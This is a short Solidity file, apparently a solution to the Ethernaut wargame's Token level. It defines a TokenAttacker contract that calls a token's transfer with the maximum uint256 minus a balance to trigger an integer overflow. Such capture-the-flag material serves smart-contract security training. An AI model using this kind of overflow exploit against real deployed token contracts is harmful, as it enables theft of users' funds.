// Copy from https://ethernaut.openzeppelin.com/level/5
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenAttacker {
    IToken public token;

    constructor(address _token) {
        token = IToken(_token);
    }

    function attack(address _to) public {
        uint256 balance = token.balanceOf(msg.sender);

        // overflow
        token.transfer(_to, type(uint256).max - balance);
    }
}
